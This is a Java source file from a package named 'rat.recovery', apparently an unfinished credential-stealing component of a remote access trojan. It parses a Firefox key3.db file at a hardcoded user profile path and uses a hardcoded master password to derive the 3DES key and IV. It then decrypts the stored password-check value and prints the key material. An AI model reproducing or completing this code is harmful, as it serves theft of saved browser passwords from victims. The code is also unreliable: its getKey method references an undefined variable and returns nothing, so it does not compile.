package de.sogomn.rat.recovery;

import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import de.sogomn.engine.util.FileUtils;

/*
 * TEST CLASS!!!
 */
public final class Firefox {
	
	private static final byte[] GLOBAL_SALT_KEY = "global-salt".getBytes();
	private static final byte[] PASSWORD_CHECK_KEY = "password-check".getBytes();
	private static final byte[] PRIVATE_KEY_KEY = {(byte)0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
	private static final int GLOBAL_SALT_LENGTH = 20;
	private static final int PASSWORD_CHECK_LENGTH = 16;
	private static final int PRIVATE_KEY_LENGTH = 143;
	private static final int ENTRY_SALT_LENGTH = 20;
	private static final int TRIPLE_DES_KEY_LENGTH = 24;
	private static final int INITIALIZING_VECTOR_LENGTH = 8;
	
	private Firefox() {
		//...
	}
	
	private static int indexOf(final byte[] data, final byte[] subData) {
		if (subData.length > data.length || data.length == 0 || subData.length == 0) {
			return -1;
		}
		
		final byte firstByte = subData[0];
		
		for (int i = 0; i < data.length; i++) {
			final byte b = data[i];
			
			boolean found = false;
			
			if (b == firstByte) {
				found = true;
				
				for (int j = 1; j < subData.length; j++) {
					final int index = i + j;
					
					if (index > data.length - 1) {
						return -1;
					}
					
					final byte dataByte = data[index];
					final byte testByte = subData[j];
					
					if (dataByte != testByte) {
						found = false;
						
						break;
					}
				}
			}
			
			if (found) {
				return i;
			}
		}
		
		return -1;
	}
	
	private static byte[] concatenate(final byte[] one, final byte[] two) {
		final int length = one.length + two.length;
		final byte[] array = new byte[length];
		
		System.arraycopy(one, 0, array, 0, one.length);
		System.arraycopy(two, 0, array, one.length, two.length);
		
		return array;
	}
	
	public static String toHex(final byte[] data) {
		final StringBuilder builder = new StringBuilder();
		
		for(final byte b : data) {
			final String hex = String.format("%02x", b);
			builder.append(hex);
	    }
	    
	    return builder.toString();
	}
	
	/*
	 * ====================================================================================================
	 * ====================================================================================================
	 * ====================================================================================================
	 */
	
	private static byte[] getGlobalSalt(final byte[] data) {
		final int to = indexOf(data, GLOBAL_SALT_KEY);
		final int from = to - GLOBAL_SALT_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] globalSalt = Arrays.copyOfRange(data, from, to);
			
			return globalSalt;
		}
		
		return null;
	}
	
	private static byte[] getPasswordCheckEntrySalt(final byte[] data) {
		final int globalSaltKeyIndex = indexOf(data, GLOBAL_SALT_KEY);
		
		if (globalSaltKeyIndex != -1) {
			final int headerIndex = globalSaltKeyIndex + GLOBAL_SALT_KEY.length;
			final int length = data[headerIndex + 1];
			final int from = headerIndex + 3;
			final int to = from + length;
			final byte[] passwordCheckEntrySalt = Arrays.copyOfRange(data, from, to);
			
			return passwordCheckEntrySalt;
		}
		
		return null;
	}
	
	private static byte[] getPasswordCheck(final byte[] data) {
		final int to = indexOf(data, PASSWORD_CHECK_KEY);
		final int from = to - PASSWORD_CHECK_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] passwordCheck = Arrays.copyOfRange(data, from, to);
			
			return passwordCheck;
		}
		
		return null;
	}
	
	private static byte[] getPrivateKey(final byte[] data) {
		final int to = indexOf(data, PRIVATE_KEY_KEY);
		final int from = to - PRIVATE_KEY_LENGTH;
		
		if (to != -1 && from > 0) {
			final byte[] privateKey = Arrays.copyOfRange(data, from, to);
			
			return privateKey;
		}
		
		return null;
	}
	
	private static byte[] decryptTripleDesCbc(final byte[] data, final byte[] key, final byte[] initializingVector) {
		try {
			final SecretKeySpec secretKeySpec = new SecretKeySpec(key, "DESede");
			final IvParameterSpec initializingVectorSpec = new IvParameterSpec(initializingVector);
			final Cipher cipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
			
			cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, initializingVectorSpec);
			
			final byte[] decrypted = cipher.doFinal(data);
			
			return decrypted;
		} catch (final Exception ex) {
			ex.printStackTrace();
			
			return null;
		}
	}
	
	private static byte[] getKey(final byte[] data, final byte[] masterPassword) {
		final byte[] globalSalt = getGlobalSalt(data);
		final MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
		
		sha1.update(globalSalt);
		sha1.update(masterPassword);
		
		final byte[] hashedPassword = sha1.digest();
		
		sha1.update(hashedPassword);
		sha1.update(passwordCheckEntrySalt);
		
		final byte[] combinedHashedPassword = sha1.digest();
		final Mac mac = Mac.getInstance("HmacSHA1");
		final SecretKeySpec macKey = new SecretKeySpec(combinedHashedPassword, "HmacSHA1");
		final byte[] paddedEntrySalt = Arrays.copyOf(passwordCheckEntrySalt, ENTRY_SALT_LENGTH);
		
		mac.init(macKey);
		mac.update(paddedEntrySalt);
		mac.update(passwordCheckEntrySalt);
		
		final byte[] key1 = mac.doFinal();
		final byte[] tempKey = mac.doFinal(paddedEntrySalt);
		
		mac.update(tempKey);
		mac.update(passwordCheckEntrySalt);
		
		final byte[] key2 = mac.doFinal();
		final byte[] key = concatenate(key1, key2);
	}
	
	/*
	 * TODO: Method to decrypt, entry-salt as parameter
	 */
	
	public static void main(final String[] args) {
		final byte[] data = FileUtils.readExternalData("C:/Users/Sogomn/AppData/Roaming/Mozilla/Firefox/Profiles/iluy5ufi.default/key3.db");
		final byte[] globalSalt = getGlobalSalt(data);
		//final byte[] privateKey = getPrivateKey(data);
		final byte[] passwordCheckEntrySalt = getPasswordCheckEntrySalt(data);
		final byte[] passwordCheck = getPasswordCheck(data);
		
		try {
			final MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
			final byte[] masterPassword = "ajaliko6".getBytes();
			
			sha1.update(globalSalt);
			sha1.update(masterPassword);
			
			final byte[] hashedPassword = sha1.digest();
			
			sha1.update(hashedPassword);
			sha1.update(passwordCheckEntrySalt);
			
			final byte[] combinedHashedPassword = sha1.digest();
			final Mac mac = Mac.getInstance("HmacSHA1");
			final SecretKeySpec macKey = new SecretKeySpec(combinedHashedPassword, "HmacSHA1");
			final byte[] paddedEntrySalt = Arrays.copyOf(passwordCheckEntrySalt, ENTRY_SALT_LENGTH);
			
			mac.init(macKey);
			mac.update(paddedEntrySalt);
			mac.update(passwordCheckEntrySalt);
			
			final byte[] key1 = mac.doFinal();
			final byte[] tempKey = mac.doFinal(paddedEntrySalt);
			
			mac.update(tempKey);
			mac.update(passwordCheckEntrySalt);
			
			final byte[] key2 = mac.doFinal();
			final byte[] key = concatenate(key1, key2);
			final byte[] tripleDesKey = Arrays.copyOf(key, TRIPLE_DES_KEY_LENGTH);
			final byte[] initializingVector = Arrays.copyOfRange(key, key.length - INITIALIZING_VECTOR_LENGTH, key.length);
			
			final String test0 = toHex(passwordCheck);
			final String test1 = toHex(tripleDesKey);
			final String test2 = toHex(initializingVector);
			
			System.out.println("Cipher: " + test0);
			System.out.println("3DES key: " + test1);
			System.out.println("Initializing vector: " + test2);
			
			final byte[] test = decryptTripleDesCbc(passwordCheck, tripleDesKey, initializingVector);
			
			System.out.println(new String(test));
		} catch (final NoSuchAlgorithmException | InvalidKeyException ex) {
			ex.printStackTrace();
		}
	}
	
}
